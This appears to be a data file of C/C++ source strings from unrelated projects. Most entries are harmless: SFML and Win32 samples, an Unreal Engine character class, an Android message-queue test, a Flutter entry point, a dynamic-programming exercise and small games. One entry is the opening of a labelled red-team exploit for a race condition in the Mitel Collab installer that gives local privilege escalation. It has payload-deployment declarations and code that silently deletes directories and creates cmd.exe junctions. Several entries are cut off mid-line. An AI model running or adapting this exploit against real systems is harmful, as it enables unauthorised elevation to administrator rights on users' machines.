lock memory, free the buffer\r\n        return OutOfMemory;\r\n    }\r\n    CopyMemory(pBuffer, pResourceData, imageSize);\r\n\r\n    // Create an IStream object from the allocated memory\r\n    IStream* pStream = NULL;\r\n    if (::CreateStreamOnHGlobal(hBuffer, FALSE, &pStream) != S_OK)\r\n    {\r\n        ::GlobalUnlock(hBuffer);\r\n        ::GlobalFree(hBuffer);\r\n        return GenericError; // Failed to create stream\r\n    }\r\n\r\n    // Delete the previous bitmap if it exists\r\n    delete m_pBitmap;\r\n\r\n    // Create a GDI+ Bitmap object from the stream\r\n    m_pBitmap = Bitmap::FromStream(pStream);\r\n\r\n    // Release the IStream object\r\n    pStream->Release();\r\n\r\n    // Unlock and free the allocated memory\r\n    ::GlobalUnlock(hBuffer);\r\n    ::GlobalFree(hBuffer);\r\n\r\n    // Check if the bitmap was created successfully\r\n    if (m_pBitmap == NULL)\r\n    {\r\n        return OutOfMemory; // Failed to create bitmap\r\n    }\r\n\r\n    Status status = m_pBitmap->GetLastStatus();\r\n    if (status != Ok)\r\n    {\r\n        delete m_pBitmap;\r\n        m_pBitmap = NULL;\r\n    }\r\n\r\n    return status;\r\n}\r\n\r\nvoid SG_PNGView::OnPaint()\r\n{\r\n    CPaintDC dc(this); // device context for painting\r\n    CRect rect;\r\n    GetClientRect(&rect);\r\n\r\n    i",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Graphics.hpp>\n#include <windows.h>\n#include <cmath>\n\nHWND button;\n\n\n////////////////////////////////////////////////////////////\n/// Function called whenever one of our windows receives a message\n///\n////////////////////////////////////////////////////////////\nLRESULT CALLBACK onEvent(HWND handle, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n        // Quit when we close the main window\n        case WM_CLOSE:\n        {\n            PostQuitMessage(0);\n            return 0;\n        }\n\n        // Quit when we click the \"quit\" button\n        case WM_COMMAND:\n        {\n            if (reinterpret_cast<HWND>(lParam) == button)\n            {\n                PostQuitMessage(0);\n                return 0;\n            }\n        }\n    }\n\n    return DefWindowProc(handle, message, wParam, lParam);\n}\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\param Instance: Instance of the application\n///\n/// \\return Error code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    HINSTANCE instance = GetModuleHandle(NULL);\n\n    // Define a class for our main window\n    WNDCLASS windowClass;\n    windowClass.style         = 0;\n    windowClass.lpfnWndProc   = &onEvent;\n    windowClass.cbClsExtra    = 0;\n    windowClass.cbWndExtra    = 0;\n    windowClass.hInstance     = instance;\n    windowClass.hIcon         = NULL;\n    windowClass.hCursor       = 0;\n    windowClass.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_BACKGROUND);\n    windowClass.lpszMenuName  = NULL;\n    windowClass.lpszClassName = TEXT(\"SFML App\");\n    RegisterClass(&windowClass);\n\n    // Let's create the main window\n    HWND window = CreateWindow(TEXT(\"SFML App\"), TEXT(\"SFML Win32\"), WS_SYSMENU | WS_VISIBLE, 200, 200, 660, 520, NULL, NULL, instance, NULL);\n\n    // Add a button for exiting\n    button = CreateWindow(TEXT(\"BUTTON\"), TEXT(\"Quit\"), WS_CHILD | WS_VISIBLE, 560, 440, 80, 40, window, NULL, instance, NULL);\n\n    // Let's create two SFML views\n    HWND view1 = CreateWindow(TEXT(\"STATIC\"), NULL, WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS, 20,  20, 300, 400, window, NULL, instance, NULL);\n    HWND view2 = CreateWindow(TEXT(\"STATIC\"), NULL, WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS, 340, 20, 300, 400, window, NULL, instance, NULL);\n    sf::RenderWindow SFMLView1(view1);\n    sf::RenderWindow SFMLView2(view2);\n\n    // Load some textures to display\n    sf::Texture texture1, texture2;\n    if (!texture1.loadFromFile(\"resources/image1.jpg\") || !texture2.loadFromFile(\"resources/image2.jpg\"))\n        return EXIT_FAILURE;\n    sf::Sprite sprite1(texture1);\n    sf::Sprite sprite2(texture2);\n    sprite1.setOrigin(sf::Vector2f(texture1.getSize()) / 2.f);\n    sprite1.setPosition(sprite1.getOrigin());\n\n    // Create a clock for measuring elapsed time\n    sf::Clock clock;\n\n    // Loop until a WM_QUIT message is received\n    MSG message;\n    message.message = static_cast<UINT>(~WM_QUIT);\n    while (message.message != WM_QUIT)\n    {\n        if (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))\n        {\n            // If a message was waiting in the message queue, process it\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n        }\n        else\n        {\n            float time = clock.getElapsedTime().asSeconds();\n\n            // Clear views\n            SFMLView1.clear();\n            SFMLView2.clear();\n\n            // Draw sprite 1 on view 1\n            sprite1.setRotation(time * 100);\n            SFMLView1.draw(sprite1);\n\n            // Draw sprite 2 on view 2\n            sprite2.setPosition(std::cos(time) * 100.f, 0.f);\n            SFMLView2.draw(sprite2);\n\n            // Display each view on screen\n            SFMLView1.display();\n            SFMLView2.display();\n        }\n    }\n\n    // Destroy the main window (all its child controls will be destroyed)\n    DestroyWindow(window);\n\n    // Don't forget to unregister the window class\n    UnregisterClass(TEXT(\"SFML App\"), instance);\n\n    return EXIT_SUCCESS;\n}\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"EOSSystemCharacter.h\"\n#include \"UObject/ConstructorHelpers.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"Components/DecalComponent.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"GameFramework/PlayerController.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"Materials/Material.h\"\n#include \"Engine/World.h\"\n\nAEOSSystemCharacter::AEOSSystemCharacter()\n{\n\t// Set size for player capsule\n\tGetCapsuleComponent()->InitCapsuleSize(42.f, 96.0f);\n\n\t// Don't rotate character to camera direction\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = false;\n\tbUseControllerRotationRoll = false;\n\n\t// Configure character movement\n\tGetCharacterMovement()->bOrientRotationToMovement = true; // Rotate character to moving direction\n\tGetCharacterMovement()->RotationRate = FRotator(0.f, 640.f, 0.f);\n\tGetCharacterMovement()->bConstrainToPlane = true;\n\tGetCharacterMovement()->bSnapToPlaneAtStart = true;\n\n\t// Create a camera boom...\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->SetUsingAbsoluteRotation(true); // Don't want arm to rotate when character does\n\tCameraBoom->TargetArmLength = 800.f;\n\tCameraBoom->SetRelativeRotation(FRotator(-60.f, 0.f, 0.f));\n\tCameraBoom->bDoCollisionTest = false; // Don't want to pull camera in when it collides with level\n\n\t// Create a camera...\n\tTopDownCameraComponent = CreateDefaultSubobject<UCameraComponent>(TEXT(\"TopDownCamera\"));\n\tTopDownCameraComponent->SetupAttachment(CameraBoom, USpringArmComponent::SocketName);\n\tTopDownCameraComponent->bUsePawnControlRotation = false; // Camera does not rotate relative to arm\n\n\t// Activate ticking in order to update the cursor every frame.\n\tPrimaryActorTick.bCanEverTick = true;\n\tPrimaryActorTick.bStartWithTickEnabled = true;\n}\n\nvoid AEOSSystemCharacter::Tick(float DeltaSeconds)\n{\n    Super::Tick(DeltaSeconds);\n}\n",
    "/*\n* Copyright (C) 2016 The Android Open Source Project\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n*      http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n#include <gtest/gtest.h>\n#ifndef GTEST_IS_THREADSAFE\n#error \"GTest did not detect pthread library.\"\n#endif\n\n#include <aidl/android/fmq/test/FixedParcelable.h>\n#include <aidl/android/fmq/test/FixedUnion.h>\n#include <aidl/android/fmq/test/ITestAidlMsgQ.h>\n#include <android-base/logging.h>\n#include <android/binder_manager.h>\n#include <android/binder_process.h>\n#include <android/hardware/tests/msgq/1.0/ITestMsgQ.h>\n#include <fmq/AidlMessageQueue.h>\n#include <fmq/EventFlag.h>\n#include <fmq/MessageQueue.h>\n#include <hidl/ServiceManagement.h>\n\n// libutils:\nusing android::OK;\nusing android::sp;\nusing android::status_t;\n\n// generated\nusing ::aidl::android::fmq::test::EventFlagBits;\nusing ::aidl::android::fmq::test::FixedParcelable;\nusing ::aidl::android::fmq::test::FixedUnion;\nusing ::aidl::android::fmq::test::ITestAidlMsgQ;\nusing android::hardware::tests::msgq::V1_0::ITestMsgQ;\n\n// libhidl\nusing android::hardware::kSynchronizedReadWrite;\nusing android::hardware::kUnsynchronizedWrite;\nusing android::hardware::MessageQueue;\nusing android::hardware::MQDescriptorSync;\nusing android::hardware::MQDescriptorUnsync;\nusing android::hardware::details::waitForHwService;\n\nusing aidl::android::hardware::common::fmq::SynchronizedReadWrite;\nusing aidl::android::hardware::common::fmq::UnsynchronizedWrite;\nusing android::hardware::kSynchronizedReadWrite;\nusing android::hardware::kUnsynchronizedWrite;\n\ntypedef android::AidlMessageQueue<int32_t, SynchronizedReadWrite> AidlMessageQueueSync;\ntypedef android::AidlMessageQueue<int32_t, UnsynchronizedWrite> AidlMessageQueueUnsync;\ntypedef android::hardware::MessageQueue<int32_t, kSynchronizedReadWrite> MessageQueueSync;\ntypedef android::hardware::MessageQueue<int32_t, kUnsynchronizedWrite> MessageQueueUnsync;\nstatic const std::string kServiceName = \"BnTestAidlMsgQ\";\nstatic const size_t kPageSize = getpagesize();\nstatic const size_t kNumElementsInSyncQueue = (kPageSize - 16) / sizeof(int32_t);\n\nenum class SetupType {\n    SINGLE_FD,\n    DOUBLE_FD,\n};\n\ntemplate <typename T, SetupType setupType>\nclass TestParamTypes {\n  public:\n    typedef T MQType;\n    static constexpr bool UserFd = setupType == SetupType::DOUBLE_FD;\n};\n\n// Run everything on both the AIDL and HIDL versions with one and two FDs\ntypedef ::testing::Types<TestParamTypes<AidlMessageQueueSync, SetupType::SINGLE_FD>,\n                         TestParamTypes<MessageQueueSync, SetupType::SINGLE_FD>,\n                         TestParamTypes<AidlMessageQueueSync, SetupType::DOUBLE_FD>,\n                         TestParamTypes<MessageQueueSync, SetupType::DOUBLE_FD>>\n        SyncTypes;\ntypedef ::testing::Types<TestParamTypes<AidlMessageQueueUnsync, SetupType::SINGLE_FD>,\n                         TestParamTypes<MessageQueueUnsync, SetupType::SINGLE_FD>,\n                         TestParamTypes<AidlMessageQueueUnsync, SetupType::DOUBLE_FD>,\n                         TestParamTypes<MessageQueueUnsync, SetupType::DOUBLE_FD>>\n        UnsyncTypes;\n\ntemplate <typename T>\nclass ClientSyncTestBase : public ::testing::Test {};\n\n// Specialize for AIDL\ntemplate <>\nclass ClientSyncTestBase<AidlMessageQueueSync> : public ::testing::Test {\n  protected:\n    static std::shared_ptr<ITestAidlMsgQ> waitGetTestService() {\n        const std::string instance = std::string() + ITestAidlMsgQ::descriptor + \"/default\";\n        ndk::SpAIBinder binder(AServiceManager_getService(instance.c_str()));\n        return ITestAidlMsgQ::fromBinder(binder);\n    }\n    bool configureFmqSyncReadWrite(AidlMessageQueueSync* mq) {\n        bool result = false;\n        auto ret = mService->configureFmqSyncReadWrite(mq->dupeDesc(), &result);\n        return result && ret.isOk();\n    }\n    bool requestReadFmqSync(size_t dataLen) {\n        bool result = false;\n        auto ret = mService->requestReadFmqSync(dataLen, &result);\n        return result && ret.isOk();\n    }\n    bool requestWriteFmqSync(size_t dataLen) {\n        bool result = false;\n        auto ret = mService->requestWriteFmqSync(dataLen, &result);\n        return result && ret.isOk();\n    }\n\n    std::shared_ptr<ITestAidlMsgQ> mService;\n};\n\n// Specialize for HIDL\ntemplate <>\nclass ClientSyncTestBase<MessageQueueSync> : public ::testing::Test {\n  protected:\n    static sp<ITestMsgQ> waitGetTestService() {\n        android::hardware::details::setTrebleTestingOverride(true);\n        // waitForHwService is required because ITestMsgQ is not in ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"interactive_forms_with_rive\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <windows.h>\r\n#include <winbase.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <tchar.h>\r\n#include <strsafe.h>\r\n#include <pathcch.h>\r\n#include <Shlwapi.h>\r\n#pragma comment(lib, \"Pathcch.lib\")\r\n#pragma comment(lib, \"Shlwapi.lib\")\r\n#include \"stdafx.h\"\r\n\r\n\r\n// This is Mitel Collab installer race condition LPE exploit.\r\n// Developed by Julian Horoszkiewicz (Eviden Red Team).\r\n// Code based on https://learn.microsoft.com/en-us/windows/win32/fileio/obtaining-directory-change-notifications and https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory, FileOplock code taken from Google's https://github.com/googleprojectzero/symboliclink-testing-tools\r\n\r\nvoid RefreshDirectory(LPTSTR);\r\nvoid RefreshTree(LPTSTR);\r\nvoid WatchTempDirectory(LPTSTR);\r\nvoid WatchAndRaceTempFile(LPTSTR);\r\nvoid deploy_payload(LPTSTR);\r\nint create_hardlink(LPCWSTR, LPCWSTR);\r\nHANDLE hFind = INVALID_HANDLE_VALUE;\r\nHANDLE hFind2 = INVALID_HANDLE_VALUE;\r\nHANDLE hFind3 = INVALID_HANDLE_VALUE;\r\nHANDLE hFind4 = INVALID_HANDLE_VALUE;\r\nTCHAR LOCALAPPDATA[MAX_PATH];\r\nTCHAR LOCALAPPDATA_MOVED[MAX_PATH]; //Moved\r\nTCHAR LOCALAPPDATA_NEW[MAX_PATH]; //New\r\nTCHAR MITELCOLLAB_TEMP_DIRNAME[MAX_PATH];\r\nTCHAR MITELCOLLAB_TEMP_DIRMASK[MAX_PATH];\r\nTCHAR DLL_PATH[MAX_PATH];\r\nTCHAR DLL_COPY_PATH[MAX_PATH];\r\nTCHAR DLL_DEPLOY_PATH[MAX_PATH];\r\nTCHAR CURRENT_DIR[MAX_PATH];\r\n\r\nWIN32_FIND_DATA ffd;\r\nWIN32_FIND_DATA ffd2;\r\nWIN32_FIND_DATA ffd3;\r\nWIN32_FIND_DATA ffd4;\r\nDWORD dwError = 0;\r\n// Find the first file in the directory.\r\nTCHAR FIRST_TEMP_FILENAME[MAX_PATH];\r\nTCHAR FIRST_TEMP_FILEMASK[MAX_PATH];\r\nTCHAR FIRST_OLD_TEMP_FILEMASK[MAX_PATH];\r\nTCHAR OLD_TEMP_FILENAME[MAX_PATH];\r\nTCHAR MITELCOLLAB_MSI_FILE[MAX_PATH];\r\nTCHAR MSIEXEC_COMMAND_LINE[MAX_PATH];\r\nTCHAR TEMP_NAME_BASE[7];\r\nchar* DLL_BUFFER;\r\nint FAIL_COUNT = 0;\r\nint THREAD_COUNT = 0;\r\nint MAX_FAILS = 100;\r\nint SCAN_FAIL_COUNT = 0;\r\nint SCAN_FAIL_MAX = 100;\r\nsize_t DLL_BUFF_LENGTH = 0;\r\n\r\n\r\n\r\nint remove_old_directory_recurse(LPTSTR path) // this is our cleanup function to recursively remove old temp installer directories\r\n{\r\n    // taken from https://stackoverflow.com/questions/4180351/unable-to-delete-a-folder-with-shfileoperation \r\n    _tprintf(TEXT(\"Recursively removing %s...\\n\"), path);\r\n    int path_len = lstrlen(path);\r\n    TCHAR path_double_null_terminated[MAX_PATH];\r\n    memset(path_double_null_terminated, 0, MAX_PATH *sizeof(TCHAR)); // fill it with zeroes, so it is for sure double null terminated\r\n    StringCchCat(path_double_null_terminated, MAX_PATH, path); // now write it into the buffer, this should do the trick\r\n\r\n    SHFILEOPSTRUCT dir_to_remove = {\r\n    NULL,\r\n    FO_DELETE,\r\n    path,\r\n    NULL,\r\n    FOF_SILENT | FOF_NOERRORUI | FOF_NOCONFIRMATION,\r\n    FALSE,\r\n    NULL,\r\n    NULL };\r\n    // now, double-terminate the string\r\n    if (SHFileOperation(&dir_to_remove) == 0)\r\n    {\r\n        _tprintf(TEXT(\"Success!\\n\"));\r\n        return 1;\r\n    }\r\n    else\r\n    {\r\n        _tprintf(TEXT(\"Failed - this will most likely break the exploitation process!\\n\"));\r\n        return 0;\r\n    }\r\n}\r\n\r\nint create_hardlink(LPCWSTR existing, LPCWSTR hardlink) // runs \r\n{\r\n    // Write - Host \"Creating the junction to the copy of the original dir..\"\r\n    //    cmd.exe / c 'mklink /J \"Setup Client\" \"Setup Client2\"'\r\n    // we must wait for the process to exit, otherwise we will run into race conditions with ourselves\r\n    TCHAR cmdline[MAX_PATH];\r\n    StringCchCopy(cmdline, MAX_PATH, TEXT(\"/c mklink /J \"));\r\n    StringCchCat(cmdline, MAX_PATH, TEXT(\"\\\"\"));\r\n    StringCchCat(cmdline, MAX_PATH, hardlink);\r\n    StringCchCat(cmdline, MAX_PATH, TEXT(\"\\\" \"));\r\n    StringCchCat(cmdline, MAX_PATH, TEXT(\"\\\"\"));\r\n    StringCchCat(cmdline, MAX_PATH, existing);\r\n    StringCchCat(cmdline, MAX_PATH, TEXT(\"\\\"\"));\r\n    _tprintf(TEXT(\"Running cmd.exe %s\\n\"), cmdline);\r\n    DWORD child_PID = 0;\r\n    STARTUPINFO si;\r\n    PROCESS_INFORMATION pi;\r\n    ZeroMemory(&si, sizeof(si));\r\n    si.cb = sizeof(si);\r\n    ZeroMemory(&pi, sizeof(pi));\r\n    TCHAR MOD_NAME[MAX_PATH];\r\n    StringCchCopy(MOD_NAME, MAX_PATH, TEXT(\"C:\\\\Windows\\\\System32\\\\cmd.exe\"));\r\n    HANDLE ch_Handle = INVALID_HANDLE_VALUE;\r\n    // Start the child process. \r\n    if (!CreateProcess(MOD_NAME,   // No module name (use command line)\r\n        cmdline,        // Command line\r\n        NULL,           // Process handle not inheritable\r\n        NULL,           // Thread handle not inheritable\r\n        FALSE,          // Set handle inheritance to FALSE\r\n        0,              // No creation flags\r\n        NULL,           // Use parent's environment block\r\n        NULL,           // Use parent's starting directory \r\n        &si,            // Pointer to STARTUPINFO structure\r\n        &pi)           // Pointer to PROCESS_INFORMATION structure\r\n        )\r\n    {\r\n        printf(\"CreateProcess failed (%d). Exiting!\\n\", GetLastError());        \r\n        ExitProcess(1);\r\n    }\r\n    WaitForSingleObject(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwPr",
    "#include<iostream>\n#include<vector>\nusing namespace std;\n\n\nint usingRecursion(vector<int> &nums,int end){\n    if(end<0){\n        return 0;  // array is empty\n    }\n    if(end==0){\n        return nums[0];  // single element in the array\n    }\n\n    int including=usingRecursion(nums,end-2)+nums[end];  // including the element by adding and decrementing the end by 2 b/c we need non-adjacent elements\n    int excluding=usingRecursion(nums,end-1)+0;   // adding zero (including nothing) and decrementing the end by 1 b/c we need adjacent element to exclude\n\n    return max(including,excluding);\n}\n\n\nint topDownApproach(vector<int> &nums,int end,vector<int> &dp){\n    if(end<0){\n        return 0;  // array is empty\n    }\n    if(end==0){\n        return nums[0];  // single element in the array\n    }\n    if(dp[end]!=-1){\n        return dp[end];   // checking if the answer already exists or not\n\n    }\n    int including=usingRecursion(nums,end-2)+nums[end]; \n    int excluding=usingRecursion(nums,end-1)+0;\n\n    dp[end]=max(including,excluding); // inserting the answers in the dp array\n\n    return dp[end];\n}\n\n\n\nint bottomUpApproach(vector<int> &nums){\n    int n=nums.size();\n    vector<int> dp(n,0);  // creating a dp array for tabulation\n\n    dp[0]=nums[0];  // from the base case from the above function\n\n    for(int i=1;i<n;i++){\n        int including = nums[i];\n        if (i > 1) {      // checking index bounds\n            including =dp[i-2]+nums[i];\n        }\n        int excluding=dp[i-1]+0;\n        dp[i]=max(including,excluding);\n    }\n    return dp[n-1];\n}\n\n\n\nint spaceOptimiationv(vector<int> &nums){\n    int n=nums.size();\n\n    int prev1=0;    // 2 initial variables\n    int prev2=nums[0];\n    int curr;\n    for(int i=1;i<n;i++){\n        int including=prev1+nums[i];\n        int excluding=prev2+0;\n        curr=max(including,excluding); // updating current value\n        prev1=prev2;\n        prev2=curr;\n    }\n\n    return prev2;\n}\n\n\n\nint main(){\n    vector<int> nums={9,9,8,2};\n    int n=nums.size();\n\n    int ans1=usingRecursion(nums,n-1);   // passing the array and the last index\n    cout<<\"Maximum sum using recursion is: \"<<ans1<<endl;\n\n    vector<int> dp(n,-1);\n    int ans2=topDownApproach(nums,n-1,dp);\n    cout<<\"Maximum sum using top-down approach is: \"<<ans2<<endl;\n\n    int ans3=bottomUpApproach(nums);\n    cout<<\"Maximum sum using bottom-up approach is: \"<<ans3<<endl;\n\n    int ans4=spaceOptimiationv(nums);\n    cout<<\"Maximum sum using space-optimization approach is: \"<<ans4<<endl;\n\n\n    return 0;\n}",
    "\ufeff#include <SFML/Graphics.hpp>\n#include <iostream>\n#include <random>\n#include <string>\n#include <cmath>\n\n#define PI 3.14159265\nfloat window_size_x = 2000, window_size_y = 1000;\nint n = 5;\n\nclass SpaceObject {\npublic:\n    float x = 0, y = 0, x_v = 0, y_v = 0, sphere_range = std::rand() % 100 + 10;\n    bool repulse = false;\n\n    SpaceObject(int x_cord, int y_cord, bool is_repulse) {\n        x = x_cord;\n        y = y_cord;\n        repulse = is_repulse;\n    }\n\n    SpaceObject(int x_cord, int y_cord, int x_speed, int y_speed, bool is_repulse) {\n        x = x_cord;\n        y = y_cord;\n        x_v = x_speed;\n        y_v = y_speed;\n        repulse = is_repulse;\n    }\n\n    SpaceObject(int x_cord, int y_cord, int x_speed, int y_speed, bool is_repulse, int sphere_r) {\n        x = x_cord;\n        y = y_cord;\n        x_v = x_speed;\n        y_v = y_speed;\n        repulse = is_repulse;\n        sphere_range = sphere_r;\n    }\n\n    void move(float seconds_from_last_flip) {\n        x += x_v * seconds_from_last_flip;\n        y += y_v * seconds_from_last_flip;\n\n        if (!repulse) { return; }\n        if (x + sphere_range > window_size_x || 0 > x - sphere_range) {\n            x_v = -x_v;\n            x = std::min(window_size_x - sphere_range, std::max(0.0f + sphere_range, x));\n        }\n        if (y + sphere_range > window_size_y || 0 > y - sphere_range) {\n            y_v = -y_v;\n            y = std::min(window_size_y - sphere_range, std::max(0.0f + sphere_range, y));\n        }\n    }\n};\n\nclass Bullet : public SpaceObject {\npublic:\n    sf::RectangleShape sprite;\n    bool exist = false;\n    int speed = 400;\n\n    Bullet() : SpaceObject(0, 0, 0, 0, false) {\n    }\n\n    void flip(float dt) {\n        if (exist) {\n            move(dt);\n            if (x > window_size_x || x < 0 || y > window_size_y || y < 0) {\n                exist = false;\n                sprite.setFillColor(sf::Color(255, 255, 255, 255));\n            }\n            sprite.setPosition(x, y);\n        }\n    }\n\n\n    void setup(int x_pos, int y_pos, float rotate) {\n        sprite.setFillColor(sf::Color(255, 255, 255));\n        sprite.setSize(sf::Vector2f(5, 30));\n        sprite.setRotation(rotate);\n        exist = true;\n        x = x_pos;\n        y = y_pos;\n        x_v = speed * cos((180 - rotate + 90) * PI / 180);\n        y_v = -speed * sin((180 - rotate + 90) * PI / 180);\n        std::cout << x_v << \" \" << y_v << \" \" << 180 - rotate + 90 << \"\\n\";\n        sprite.setPosition(x, y);\n    }\n};\n\n\nclass Controllable : public SpaceObject {\npublic:\n    sf::Sprite sprite;\n    float fric = 2;\n    float accel = 90;\n    float rotate = 0;\n    int rotation_speed = 80;\n    int time_from_last_shoot = 0;\n    int cooldown = 1;\n    static const int max_bullets = 10;\n    Bullet bullets[max_bullets];\n\n    int last_bullet = 0;\n\n    Controllable() : SpaceObject(100, 100, false) {\n    }\n\n    void flip(float dt) {\n        x += x_v * dt;\n        y += y_v * dt;\n        sprite.setRotation(rotate);\n        x_v -= sin((360 - rotate) * PI / 180) * fric * dt;\n        y_v -= cos((360 - rotate) * PI / 180) * fric * dt;\n        sprite.setPosition(sf::Vector2(x, y));\n\n        for (int i = 0; i < max_bullets; i++) {\n            bullets[i].flip(dt);\n        }\n    }\n\n    void clockwise_rotate(float dt) {\n        rotate += rotation_speed * dt;\n    }\n\n    void counterclockwise_rotate(float dt) {\n        rotate -= rotation_speed * dt;\n    }\n\n    void acceleration(float dt) {\n        x_v += sin((360 - rotate) * PI / 180) * accel * dt;\n        y_v += cos((360 - rotate) * PI / 180) * accel * dt;\n\n    }\n\n    void shoot(float global_timer_seconds) {\n        if (global_timer_seconds - time_from_last_shoot < cooldown) {\n            return;\n        }\n        time_from_last_shoot = global_timer_seconds;\n        bullets[last_bullet].setup(x, y, sprite.getRotation());\n        last_bullet++;\n        if (last_bullet > n - 1) {\n            last_bullet = 0;\n        }\n    }\n};\n\nclass Destroyer : public Controllable {\n    sf::Texture texture;\n    float scale = 0.2;\npublic:\n    Destroyer() : Controllable() {\n        texture.loadFromFile(\"textures/ship1.png\");\n        sprite.setTexture(texture);\n        sprite.setOrigin(texture.getSize().x / 2, texture.getSize().y / 2);\n        sprite.setScale(sf::Vector2(scale, scale));\n    }\n};\n\nclass Enemy : public SpaceObject {\npublic:\n    sf::CircleShape hitbox;\n    sf::Texture texture;\n    bool exist = true;\n\n    Enemy(int size, int x_cord, int y_cord, int x_speed, int y_speed) : SpaceObject(x_cord, y_cord, x_speed, y_speed,\n        true, size) {\n        hitbox_setup();\n    }\n\n    Enemy(int size, int x_cord, int y_cord) : SpaceObject(x_cord, y_cord, std::rand() % 100, std::rand() % 100, true,\n        size) {\n        hitbox_setup();\n    }\n\n    Enemy(int size, int x_cord, int y_cord, std::string texture_path) : SpaceObject(x_cord, y_cord, std::rand() % 100,\n        std::rand() % 100, true, size) {\n        hitbox_setup();\n        texture_setup(texture_path);\n    }\n\n    Enemy() : SpaceObject(std:",
    "#include <iostream>\n#include <cstdlib>\nusing namespace std;\n\nvoid game();\nvoid exit();\n\nint main() {\n    int startChoice;\n    cout << \"Hi Welcome, Game is Loading...\" << endl;\n    cout << \"Type '0' to Play\" << endl;\n    cout << \"Type '1' to Quit\" << endl;\n    cin >> startChoice;\n    \n    if (startChoice == 0) {\n        game();\n    } else if (startChoice == 1) {\n        exit();\n    } else {\n        cout << \"Invalid choice. Please restart the program and choose 0 to play or 1 to quit.\" << endl;\n    }\n    \n    return 0;\n}\n\nvoid game() {\n    int userChoice = 0; // 1 = Rock, 2 = Paper, 3 = Scissors\n    int botChoice;\n    int result;\n    \n    while (true) {\n        cout << \"Ready to begin? Choose your weapon! (1 = Rock, 2 = Paper, 3 = Scissors): \" << endl;\n        cin >> userChoice;\n\n        if (userChoice < 1 || userChoice > 3) {\n            cout << \"Invalid choice, Please choose a valid number i.e. (1, 2, or 3).\" << endl;\n            continue; // Prompt the user again\n        }\n\n        botChoice = rand() % 3 + 1; // Generates a number between 1 and 3\n\n        if (userChoice == 1) {\n            if (botChoice == 1) {\n                cout << \"It's a tie, both chose Rock!\" << endl;\n            } else if (botChoice == 2) {\n                cout << \"You lose, Paper beats Rock!\" << endl;\n            } else {\n                cout << \"You win, Rock beats Scissors!\" << endl;\n            }\n        } else if (userChoice == 2) {\n            if (botChoice == 1) {\n                cout << \"You win, Paper beats Rock!\" << endl;\n            } else if (botChoice == 2) {\n                cout << \"It's a tie, both chose Paper!\" << endl;\n            } else {\n                cout << \"You lose, Scissors beats Paper!\" << endl;\n            }\n        } else if (userChoice == 3) {\n            if (botChoice == 1) {\n                cout << \"You lose, Rock beats Scissors!\" << endl;\n            } else if (botChoice == 2) {\n                cout << \"You win, Scissors beats Paper!\" << endl;\n            } else {\n                cout << \"It's a tie, both chose Scissors!\" << endl;\n            }\n        }\n        cout << \"Thanks for playing! To play again type '1'.\" << endl;\n        cout << \"To quit, type any other number.\" << endl;\n        int endChoice;\n        cin >> endChoice;\n        if (endChoice != 1) {\n            cout << \"Goodbye!\" << endl;\n            break;\n        }\n    }\n}\n\nvoid exit() {\n    cout << \"Goodbye!\" << endl;\n}\n",
